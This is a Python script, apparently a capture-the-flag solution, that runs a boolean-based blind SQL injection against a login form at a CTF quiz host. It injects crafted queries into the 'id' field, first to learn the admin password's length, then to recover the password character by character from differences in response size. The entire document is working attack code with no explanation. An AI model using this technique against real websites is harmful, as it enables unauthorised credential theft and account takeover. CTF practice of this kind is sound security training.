import requests

url = 'http://ctfq.sweetduet.info:10080/~q6/'

pass_len = 0
for i in range(1, 100):
    sql = 'admin\' AND (SELECT LENGTH(pass) FROM user WHERE id = \'admin\') = {counter} --'.format(
        counter=i)
    payload = {
        'id': sql,
        'pass': '',
    }
    response = requests.post(url, data=payload)
    if len(response.text) > 2000:
        pass_len = i
        print('length of the password is {counter}'.format(counter=pass_len))
        break

password = ''
for index in range(1, pass_len + 1):
    for char_number in range(48, 123):
        char = chr(char_number)
        print('{}{}'.format(password, char))
        sql = 'admin\' AND SUBSTR((SELECT pass FROM user WHERE id = \'admin\'), {index}, 1) = \'{char}\' --'.format(
            index=index, char=char)
        payload = {
            'id': sql,
            'pass': ''
        }
        response = requests.post(url, data=payload)
        if len(response.text) > 2000:
            print(char, end="")
            password += char
            break

print()
print(password)
